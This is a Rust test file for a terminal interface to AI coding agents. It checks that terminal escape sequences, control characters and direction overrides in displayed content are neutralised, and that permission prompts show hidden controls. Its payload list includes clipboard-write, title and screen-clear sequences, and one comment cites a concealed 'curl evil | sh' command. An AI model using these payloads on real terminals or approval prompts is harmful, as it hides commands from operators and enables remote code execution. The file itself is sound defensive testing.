// SPDX-License-Identifier: Apache-2.0
// Copyright (c) Viacheslav Shynkarenko

//! What the backend, the repository and the operator put on screen never
//! reaches the terminal as anything but text.
//!
//! Every place content is drawn is given each payload below, and the frame is
//! handed to a real crossterm backend writing to memory, as `Terminal::draw`
//! would: the bytes that come out must hold no control character, no escape
//! sequence of the content's own and no character that reorders the text
//! around it — a right-to-left override in a session's title would otherwise
//! reverse what the operator reads after it.

#![allow(
    clippy::expect_used,
    reason = "test helpers: a failed expectation is the test failing"
)]

mod common;

use common::{hunk, running_session};
use niobe_core::event::{AgentId, Event, SlashCommand, ToolOutcome};
use niobe_core::{Action, Proposal};
use niobe_tui::app::{App, Repo, WorkingFile};
use niobe_tui::shell::Ran;
use niobe_tui::ui;
use ratatui::Terminal;
use ratatui::backend::{Backend, CrosstermBackend, TestBackend};
use ratatui::crossterm::event::{KeyCode, KeyEvent, KeyModifiers};

const PAYLOADS: &[(&str, &str)] = &[
    ("osc52", "\x1b]52;c;ZXZpbA==\x07"),
    ("title", "\x1b]0;PWNED\x07"),
    ("clear", "\x1b[2J"),
    ("altscreen", "\x1b[?1049l"),
    ("cr", "A\rB"),
    ("bs", "A\x08B"),
    ("del", "A\x7fB"),
    ("rlo", "A\u{202e}B"),
    ("alm", "A\u{61c}B"),
    ("c1csi", "A\u{9b}31mB"),
    ("vt", "A\x0bB"),
    ("ff", "A\x0cB"),
    ("tab", "A\tB"),
    ("nul", "A\0B"),
];

fn is_dangerous(c: char) -> bool {
    c.is_control() && c != '\n'
        || matches!(c, '\u{202a}'..='\u{202e}' | '\u{2066}'..='\u{2069}' | '\u{200e}' | '\u{200f}' | '\u{61c}')
}

/// Draws into a test buffer, then hands exactly those cells to a crossterm
/// backend writing to memory, as `Terminal::draw` would.
fn bytes_out(app: &mut App, w: u16, h: u16) -> (Vec<String>, Vec<u8>) {
    let mut terminal =
        Terminal::new(TestBackend::new(w, h)).expect("drawing into memory cannot fail");
    terminal
        .draw(|f| ui::draw(f, app))
        .expect("drawing into memory cannot fail");
    let buffer = terminal.backend().buffer().clone();
    let mut bad = Vec::new();
    for y in 0..h {
        for x in 0..w {
            let sym = buffer[(x, y)].symbol();
            if sym.chars().any(is_dangerous) {
                bad.push(format!("({x},{y}) {sym:?}"));
            }
        }
    }
    let sink = Sink::default();
    let mut out = CrosstermBackend::new(sink.clone());
    let cells: Vec<(u16, u16, &ratatui::buffer::Cell)> = (0..h)
        .flat_map(|y| (0..w).map(move |x| (x, y)))
        .map(|(x, y)| (x, y, &buffer[(x, y)]))
        .collect();
    out.draw(cells.into_iter())
        .expect("drawing into memory cannot fail");
    Backend::flush(&mut out).expect("drawing into memory cannot fail");
    let bytes = sink.0.borrow().clone();
    (bad, bytes)
}

#[derive(Clone, Default)]
struct Sink(std::rc::Rc<std::cell::RefCell<Vec<u8>>>);
impl std::io::Write for Sink {
    fn write(&mut self, b: &[u8]) -> std::io::Result<usize> {
        self.0.borrow_mut().extend_from_slice(b);
        Ok(b.len())
    }
    fn flush(&mut self) -> std::io::Result<()> {
        Ok(())
    }
}

fn byte_findings(bytes: &[u8]) -> Vec<String> {
    let mut found = Vec::new();
    let s = String::from_utf8_lossy(bytes);
    for (i, c) in s.char_indices() {
        if c == '\x1b' {
            let next = s[i + 1..].chars().next();
            if next != Some('[') {
                found.push(format!("ESC followed by {next:?}"));
            } else if s[i..].starts_with("\x1b[2J") || s[i..].starts_with("\x1b[?1049") {
                found.push(format!("ESC seq {:?}", &s[i..(i + 8).min(s.len())]));
            }
        } else if is_dangerous(c) {
            found.push(format!("raw {c:?}"));
        }
    }
    found.sort();
    found.dedup();
    found
}

fn check(site: &str, mut build: impl FnMut(&str) -> App) -> Vec<String> {
    let mut report = Vec::new();
    for (name, payload) in PAYLOADS {
        let mut app = build(payload);
        let (cells, bytes) = bytes_out(&mut app, 200, 60);
        let wire = byte_findings(&bytes);
        if !cells.is_empty() || !wire.is_empty() {
            report.push(format!(
                "{site}/{name}: cells={:?} wire={:?}",
                &cells[..cells.len().min(3)],
                wire
            ));
        }
    }
    report
}

fn key(code: KeyCode) -> KeyEvent {
    KeyEvent::new(code, KeyModifiers::NONE)
}

fn typed(app: &mut App, text: &str) {
    for c in text.chars() {
        app.on_key(key(KeyCode::Char(c)));
    }
}

fn with(events: Vec<Event>) -> App {
    let mut app = running_session();
    for e in &events {
        app.apply(e);
    }
    app
}

#[test]
fn no_content_puts_a_control_or_a_direction_mark_on_the_terminal() {
    let mut all = Vec::new();
    all.extend(check("assistant", |p| {
        with(vec![Event::AssistantMessage {
            text: format!("hello {p} world"),
            agent: None,
        }])
    }));
    all.extend(check("assistant-code", |p| {
        with(vec![Event::AssistantMessage {
            text: format!("```\ncode {p} here\n```\n`inline {p}`"),
            agent: None,
        }])
    }));
    all.extend(check("delta", |p| {
        with(vec![Event::AssistantDelta {
            text: format!("stream {p} x"),
        }])
    }));
    all.extend(check("user", |p| {
        with(vec![Event::UserMessage {
            text: format!("user {p} x"),
        }])
    }));
    all.extend(check("tool-start", |p| {
        with(vec![Event::ToolCallStart {
            id: "q1".into(),
            name: format!("Bash{p}"),
            input: format!("echo {p}"),
            summary: Some(format!("echo {p}")),
            agent: None,
        }])
    }));
    all.extend(check("tool-end", |p| {
        with(vec![
            Event::ToolCallStart {
                id: "q1".into(),
                name: "Bash".into(),
                input: format!("echo {p}"),
                summary: Some(format!("echo {p}")),
                agent: None,
            },
            Event::ToolCallEnd {
                id: "q1".into(),
                name: "Bash".into(),
                input: format!("echo {p}"),
                output: format!("out {p}"),
                bytes: 10,
                outcome: ToolOutcome::Failed,
                summary: Some(format!("echo {p}")),
                exit_code: Some(1),
                error: Some(format!("err {p}")),
                command: None,
                untrimmed: None,
            },
        ])
    }));
    all.extend(check("filechange", |p| {
        with(vec![Event::FileChange {
            path: format!("src/{p}.rs"),
            added: Some(1),
            removed: Some(1),
            hunks: vec![hunk(1, 1, &[&format!("-old {p}"), &format!("+new {p}")])],
            scope: niobe_core::event::ChangeScope::Project,
        }])
    }));
    all.extend(check("permission", |p| {
        with(vec![Event::PermissionRequest {
            id: "perm".into(),
            tool: format!("Bash{p}"),
            input: format!("{{\"command\":\"{p}\"}}"),
            target: Some(format!("rm {p}")),
            proposal: None,
            reason: Some(format!("why {p}")),
            agent: None,
        }])
    }));
    /// What a proposal does, built around a payload.
    type Proposing = fn(&str) -> Action;
    let actions: [(&str, Proposing); 4] = [
        ("proposed-edit", |p: &str| Action::Replace {
            path: format!("src/{p}.rs"),
            old: format!("old {p}\nkept"),
            new: format!("new {p}\nkept"),
            every: true,
        }),
        ("proposed-write", |p: &str| Action::Write {
            path: format!("src/{p}.rs"),
            content: format!("line {p}\n{p}"),
            existed: Some(true),
        }),
        ("proposed-command", |p: &str| Action::Command {
            command: format!("echo {p}"),
        }),
        ("proposed-plan", |p: &str| Action::Plan {
            plan: format!("# {p}\n\n1. **{p}**\n2. `{p}`"),
        }),
    ];
    for (name, action) in actions {
        all.extend(check(name, |p| {
            with(vec![Event::PermissionRequest {
                id: "perm".into(),
                tool: "Edit".to_owned(),
                input: serde_json::json!({ "description": p, "file_path": p }).to_string(),
                target: Some(format!("src/{p}.rs")),
                proposal: Some(Proposal::new(action(p), ["file_path"])),
                reason: None,
                agent: None,
            }])
        }));
    }
    all.extend(check("agent", |p| {
        with(vec![
            Event::AgentSpawn {
                id: AgentId::from("qa"),
                parent: None,
                kind: None,
                label: format!("agent {p}"),
            },
            Event::AgentProgress {
                id: AgentId::from("qa"),
                model: Some(format!("model{p}")),
                context_tokens: Some(1),
                latest: Some(format!("latest {p}")),
            },
        ])
    }));
    all.extend(check("title", |p| {
        with(vec![Event::Titled {
            title: format!("title {p}"),
        }])
    }));
    all.extend(check("notice", |p| {
        with(vec![Event::Notice {
            message: format!("notice {p}"),
        }])
    }));
    all.extend(check("error", |p| {
        with(vec![Event::Error {
            message: format!("error {p}"),
            fatal: false,
        }])
    }));
    all.extend(check("repo", |p| {
        let mut app = App::new(Repo {
            name: format!("repo{p}"),
            branch: Some(format!("br{p}")),
            read: true,
            ahead: None,
            behind: None,
            working: vec![WorkingFile {
                path: format!("wf{p}.rs"),
                added: Some(1),
                removed: Some(1),
                new: false,
            }],
            files: vec![],
            began: None,
        });
        app.apply(&Event::UserMessage { text: "hi".into() });
        app
    }));
    all.extend(check("outside the edit tools", |p| {
        let start = std::time::Instant::now();
        let read = |ms: u64, path: Option<String>| Repo {
            read: true,
            began: Some(start + std::time::Duration::from_millis(ms)),
            working: path
                .into_iter()
                .map(|path| WorkingFile {
                    path,
                    added: Some(1),
                    removed: Some(0),
                    new: false,
                })
                .collect(),
            ..Repo::default()
        };
        let mut app = App::new(Repo::default());
        app.apply(&Event::UserMessage { text: "hi".into() });
        app.settle_tree(start);
        app.set_repo(read(1, None));
        app.settle_tree(start + std::time::Duration::from_millis(2));
        app.apply(&Event::TurnEnded);
        app.settle_tree(start + std::time::Duration::from_millis(3));
        app.set_repo(read(4, Some(format!("fmt{p}.rs"))));
        app.settle_tree(start + std::time::Duration::from_millis(5));
        app
    }));
    all.extend(check("mention", |p| {
        let mut app = App::new(Repo {
            name: "r".into(),
            files: vec![format!("src/a{p}.rs"), "src/ab.rs".into()],
            ..Repo::default()
        });
        typed(&mut app, "look @a");
        app
    }));
    all.extend(check("slash", |p| {
        let mut app = with(vec![Event::Commands {
            commands: vec![SlashCommand {
                name: format!("rev{p}"),
                description: format!("desc {p}"),
                argument_hint: Some(format!("[{p}]")),
                mid_prompt: false,
            }],
        }]);
        typed(&mut app, "//re");
        app
    }));
    all.extend(check("bang", |p| {
        let mut app = running_session().runs_commands();
        typed(&mut app, "!echo hi");
        app.on_key(key(KeyCode::Enter));
        let cmds = app.take_commands();
        let (id, _) = cmds.first().expect("a command was queued").clone();
        app.ran(Ran {
            id,
            output: format!("line1 {p} line2\n"),
            bytes: 20,
            whole: true,
            exit_code: Some(1),
            error: Some(format!("sig {p}")),
        });
        app
    }));
    all.extend(check("meta", |p| {
        with(vec![Event::SessionMeta(niobe_core::event::SessionMeta {
            backend: niobe_core::event::Backend::Claude,
            profile: format!("prof{p}"),
            model: format!("model{p}"),
            backend_session: None,
        })])
    }));
    all.extend(check("composer", |p| {
        let mut app = running_session();
        typed(&mut app, &format!("typed {p} x"));
        app
    }));
    all.extend(check("find", |p| {
        let mut app = running_session();
        app.on_key(KeyEvent::new(KeyCode::Char('f'), KeyModifiers::CONTROL));
        typed(&mut app, &format!("q{p}"));
        app
    }));
    all.extend(check("repo-title-empty", |p| {
        App::new(Repo {
            name: format!("repo{p}"),
            branch: Some(format!("br{p}")),
            ..Repo::default()
        })
    }));
    all.extend(check("not-sent", |p| {
        let mut app = running_session();
        app.not_sent(&format!("boom {p}"));
        app
    }));
    assert!(all.is_empty(), "{all:#?}");
}

/// A shell attached to a backend that listed the command `name`, as the
/// views behind a backend's command are only offered where it did.
fn attached_offering(name: &str) -> App {
    let mut app = running_session().attached();
    app.apply(&Event::Commands {
        commands: vec![SlashCommand {
            name: name.to_owned(),
            description: String::new(),
            argument_hint: None,
            mid_prompt: false,
        }],
    });
    app
}

fn mcp_server(p: &str) -> niobe_core::event::McpServer {
    niobe_core::event::McpServer {
        name: format!("srv{p}"),
        status: niobe_core::event::McpStatus::Failed,
        source: Some(format!("src{p}")),
        tools: vec![format!("tool{p}"), format!("other{p}")],
        scope: Some(format!("scope{p}")),
        error: Some(format!("error {p}")),
        endpoint: Some(format!("stdio · run{p}")),
        reports_as: Some(format!("reports{p} 1.0")),
    }
}

fn memory_file(p: &str) -> niobe_tui::MemoryFile {
    niobe_tui::MemoryFile {
        scope: niobe_tui::memory::Scope::Imported,
        path: format!("notes/{p}.md"),
        named: format!("notes/{p}.md"),
        depth: 1,
        text: Some(format!("first {p} line\nsecond {p} line\n")),
        bytes: Some(30),
        note: Some(format!("note {p}")),
        editable: Some(format!("notes/{p}.md")),
    }
}

fn mcp_list(p: &str) -> App {
    let mut app = attached_offering("mcp");
    app.apply(&Event::McpServers {
        servers: vec![mcp_server(p)],
    });
    app.on_key(key(KeyCode::F(7)));
    app
}

fn mcp_detail(p: &str) -> App {
    let mut app = mcp_list(p);
    app.on_key(key(KeyCode::Enter));
    app
}

fn memory_list(p: &str) -> App {
    let mut app = running_session();
    app.on_key(key(KeyCode::F(8)));
    assert!(app.take_memory_request(), "F8 asked for no read");
    app.set_memory(vec![memory_file(p)]);
    app
}

fn memory_reading(p: &str) -> App {
    let mut app = memory_list(p);
    app.on_key(key(KeyCode::Enter));
    app
}

fn call_detail(p: &str) -> App {
    let mut app = running_session();
    app.apply(&Event::ToolCallEnd {
        id: "payload".into(),
        name: format!("mcp__{p}"),
        input: format!("{{\"q\":\"{p}\"}}"),
        output: format!("first {p}\nsecond {p}"),
        bytes: 64,
        outcome: niobe_core::event::ToolOutcome::Ok,
        summary: Some(p.to_owned()),
        exit_code: None,
        error: None,
        command: None,
        untrimmed: None,
    });
    app.perform(niobe_tui::menu::Action::Calls);
    app.on_key(key(KeyCode::Enter));
    assert!(app.detail().is_some(), "the call did not open");
    app
}

fn decision_stated(p: &str) -> App {
    with(vec![Event::AssistantMessage {
        text: format!("DECISION: kept {p} out of scope"),
        agent: None,
    }])
}

fn overview_page(p: &str) -> App {
    let mut app = running_session();
    app.perform(niobe_tui::menu::Action::Overview);
    app.set_overview(&format!("# What has been built in {p}\n\n| {p} | 1 | 0 |"));
    app
}

fn refused_answer(p: &str) -> App {
    let mut app = with(vec![
        Event::ToolCallStart {
            id: "q1".into(),
            name: "Bash".into(),
            input: "{}".into(),
            summary: None,
            agent: None,
        },
        Event::PermissionRequest {
            id: "q1".into(),
            tool: "Bash".into(),
            input: "{}".into(),
            target: Some("ls".into()),
            proposal: None,
            reason: None,
            agent: None,
        },
        Event::PermissionResponse {
            id: "q1".into(),
            decision: niobe_core::event::PermissionDecision::Deny,
            message: Some(format!("not that {p} one")),
        },
    ]);
    app.on_key(KeyEvent::new(KeyCode::Char('t'), KeyModifiers::CONTROL));
    app
}

fn model_picker(p: &str) -> App {
    let mut app = attached_offering("model");
    app.apply(&Event::Models {
        models: vec![niobe_core::event::ModelOption {
            id: format!("id{p}"),
            name: Some(format!("name {p}")),
            description: Some(format!("desc {p}")),
            resolves_to: Some(format!("exact{p}")),
            auto_mode: None,
        }],
    });
    app.on_key(key(KeyCode::F(4)));
    app
}

fn proposal_open(action: fn(&str) -> Action, p: &str) -> App {
    let mut app = with(vec![Event::PermissionRequest {
        id: "perm".into(),
        tool: "Edit".to_owned(),
        input: serde_json::json!({ "description": p, "file_path": p }).to_string(),
        target: Some(format!("src/{p}.rs")),
        proposal: Some(Proposal::new(action(p), ["file_path"])),
        reason: None,
        agent: None,
    }]);
    app.on_key(KeyEvent::new(KeyCode::Char('t'), KeyModifiers::CONTROL));
    app
}

fn edit_open(p: &str) -> App {
    proposal_open(
        |p| Action::Replace {
            path: format!("src/{p}.rs"),
            old: format!("old {p}\nkept"),
            new: format!("new {p}\nkept"),
            every: false,
        },
        p,
    )
}

fn write_open(p: &str) -> App {
    proposal_open(
        |p| Action::Write {
            path: format!("src/{p}.rs"),
            content: format!("line {p}\n{p}"),
            existed: Some(false),
        },
        p,
    )
}

fn command_open(p: &str) -> App {
    proposal_open(
        |p| Action::Command {
            command: format!("echo {p}"),
        },
        p,
    )
}

/// The views a backend fills and the call a refusal ended, each with a word
/// of what it draws from its content, so that a site that stopped drawing the
/// content is not passed for one that draws it safely.
/// A site's name, how it is built around a payload, and a word it draws.
type Site = (&'static str, fn(&str) -> App, &'static str);

const SITES: &[Site] = &[
    ("mcp-list", mcp_list, "srv"),
    ("mcp-detail", mcp_detail, "reports"),
    ("memory-list", memory_list, "notes/"),
    ("memory-reading", memory_reading, "second"),
    ("refused-answer", refused_answer, "not that"),
    ("model-picker", model_picker, "name"),
    ("proposed-edit-open", edit_open, "old"),
    ("proposed-write-open", write_open, "line"),
    ("proposed-command-open", command_open, "echo"),
    ("call-detail", call_detail, "output"),
    ("overview", overview_page, "built"),
    ("decision", decision_stated, "Decisions, as the agent says"),
];

#[test]
fn each_new_site_draws_the_content_it_is_given() {
    for (site, build, word) in SITES {
        let mut app = build("QQ");
        let shown = common::screen(&mut app, 200, 60);
        assert!(shown.contains(word), "{site} drew no `{word}`:\n{shown}");
        assert!(
            shown.contains("QQ"),
            "{site} drew none of its content:\n{shown}"
        );
    }
}

#[test]
fn the_views_a_backend_fills_put_no_control_or_direction_mark_on_the_terminal() {
    let mut all = Vec::new();
    for (site, build, _) in SITES {
        all.extend(check(site, build));
    }
    assert!(all.is_empty(), "{all:#?}");
}

/// The drawn frame as text, one line per row.
fn screen(app: &mut App, w: u16, h: u16) -> String {
    let mut terminal =
        Terminal::new(TestBackend::new(w, h)).expect("drawing into memory cannot fail");
    terminal
        .draw(|f| ui::draw(f, app))
        .expect("drawing into memory cannot fail");
    let buffer = terminal.backend().buffer().clone();
    (0..h)
        .map(|y| (0..w).map(|x| buffer[(x, y)].symbol()).collect::<String>())
        .collect::<Vec<_>>()
        .join("\n")
}

/// What the operator is asked to approve is what they can see: a control
/// character dropped from the drawing would let `echo safe\e[8m; curl evil |
/// sh` read as `echo safe[8m; curl evil | sh`, and a standing rule saved
/// from it would hold bytes nobody read.
#[test]
fn a_permission_question_shows_each_control_it_holds_where_the_operator_approves_it() {
    const CONTROLS: &str = "a\x1b[8mb\x07c\rd";
    const SHOWN: [char; 3] = ['\u{241b}', '\u{2407}', '\u{240d}'];
    let ask = |tool: &str, input: serde_json::Value, target: Option<String>, action| {
        with(vec![Event::PermissionRequest {
            id: "perm".into(),
            tool: tool.to_owned(),
            input: input.to_string(),
            target,
            proposal: action,
            reason: None,
            agent: None,
        }])
    };
    let cases: Vec<(&str, App)> = vec![
        (
            "command",
            ask(
                "Bash",
                serde_json::json!({ "command": CONTROLS }),
                Some(CONTROLS.to_owned()),
                Some(Proposal::new(
                    Action::Command {
                        command: CONTROLS.to_owned(),
                    },
                    ["command"],
                )),
            ),
        ),
        (
            "edit",
            ask(
                "Edit",
                serde_json::json!({ "file_path": "src/a.rs" }),
                Some("src/a.rs".to_owned()),
                Some(Proposal::new(
                    Action::Replace {
                        path: format!("src/{CONTROLS}.rs"),
                        old: format!("old {CONTROLS}"),
                        new: format!("new {CONTROLS}"),
                        every: false,
                    },
                    ["file_path"],
                )),
            ),
        ),
        (
            "write",
            ask(
                "Write",
                serde_json::json!({ "file_path": "src/a.rs" }),
                Some("src/a.rs".to_owned()),
                Some(Proposal::new(
                    Action::Write {
                        path: "src/a.rs".to_owned(),
                        content: format!("line {CONTROLS}\nnext"),
                        existed: Some(false),
                    },
                    ["file_path"],
                )),
            ),
        ),
        (
            "arguments",
            ask(
                "mcp__search__query",
                serde_json::json!({ "query": CONTROLS, "note": format!("one\n{CONTROLS}") }),
                None,
                None,
            ),
        ),
    ];

    for (name, mut app) in cases {
        let drawn = screen(&mut app, 120, 50);
        for glyph in SHOWN {
            assert!(
                drawn.contains(glyph),
                "{name} does not show {glyph:?}:\n{drawn}"
            );
        }
    }

    // The standing answer that would be saved, in the row that says so.
    let mut app = ask(
        "Bash",
        serde_json::json!({ "command": CONTROLS }),
        Some(CONTROLS.to_owned()),
        Some(Proposal::new(
            Action::Command {
                command: CONTROLS.to_owned(),
            },
            ["command"],
        )),
    );
    let drawn = screen(&mut app, 120, 50);
    let saved: Vec<&str> = drawn
        .lines()
        .filter(|l| l.contains("niobe saves Bash("))
        .collect();
    assert!(!saved.is_empty(), "no row says what is saved:\n{drawn}");
    for row in saved {
        assert!(row.contains('\u{241b}'), "{row}");
    }
}
